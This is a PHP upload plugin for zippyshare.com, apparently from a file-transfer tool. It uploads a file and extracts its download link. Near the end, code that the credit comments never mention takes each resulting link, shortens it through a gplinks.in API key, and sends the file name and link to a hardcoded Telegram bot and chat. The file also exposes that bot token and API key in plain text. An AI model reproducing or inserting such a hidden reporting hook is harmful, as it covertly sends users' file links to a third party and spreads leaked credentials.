<?php


if ($continue_up) {
	$not_done = false;
	$domain = 'zippyshare.com';
	$referer = "https://$domain/";

	// Login
	echo "<table style='width:600px;margin:auto;'>\n<tr><td align='center'>\n<div id='login' width='100%' align='center'>Login to zippyshare.com</div>\n";

	$cookie = array('ziplocale' => 'en');
	
	
	echo "<b><center>Login not found or empty, using non member upload.</center></b>\n";
		$login = false;
	

	// Retrieve upload ID
	echo "<script type='text/javascript'>document.getElementById('login').style.display='none';</script>\n<div id='info' width='100%' align='center'>Retrive upload ID</div>\n";

	$page = geturl($domain, 443, '/', $referer, $cookie, 0, 0, $_GET['proxy'], $pauth, 0, 'https');is_page($page);

	if (!preg_match('@(?<=//|\')www\d+(?=\.zippyshare\.com/upload|\';)@i', $page, $up)) html_error('Error: Cannot find upload server.');

	$post = array();
	$post['name'] = $lname;
	if ($login) {
		$post['zipname'] = $cookie['zipname'];
		$post['ziphash'] = $cookie['ziphash'];
	}
	$post['embPlayerValues'] = (!empty($cookie['embed-player-values']) ? $cookie['embed-player-values'] : 'false');
	if (!empty($_REQUEST['up_private'])) $post['private'] = 'true';
	else $post['notprivate'] = 'true';

	$up_url = sprintf('https://%s.zippyshare.com/upload', $up[0]);

	// Uploading
	echo "<script type='text/javascript'>document.getElementById('info').style.display='none';</script>\n";

	$url = parse_url($up_url);
	$upfiles = upfile($url['host'], defport($url), $url['path'].(!empty($url['query']) ? '?'.$url['query'] : ''), $referer, $cookie, $post, $lfile, $lname, 'Filedata', '', $_GET['proxy'], $pauth, 0, $url['scheme']);

	// Upload Finished
	echo "<script type='text/javascript'>document.getElementById('progressblock').style.display='none';</script>\n";

	is_page($upfiles);
	

	if (preg_match('@https?://www\d*\.zippyshare\.com/v/\w+/file\.html@i', $upfiles, $link)) $download_link = $link[0];
	
	else html_error('Download link not found.');
	
	$tgtoken = "853422522:AAGm1HLEfd8HY9ovg5sojnldNtn8uJJbvg4";	
	$tgchatid = "@tryinggroup";
	$gpapi = "https://gplinks.in/api?api=d4a09d9a3deae813e0f385ec3092f34ac62452e3&url=";
	$shorturl = cURL($gpapi.$download_link);
	$shorturl = strpbrk($shorturl,'{');
	$shorturll = json_decode($shorturl,true);
	$shorturlll = $shorturll['shortenedUrl'];
	$tgbase = "https://api.telegram.org/bot".$tgtoken."/sendmessage?chat_id=".$tgchatid."&text=".$lname.$shorturlll;
	$detail = cURL($tgbase);

}

//[17-5-2013] Written by Th3-822.
//[28-9-2014] Added private upload option. - Th3-822
//[11-1-2015] Fixed upload & Link regexp. (Happy new year) - Th3-822
//[24-6-2018] Switched to https & small changes. - Th3-822
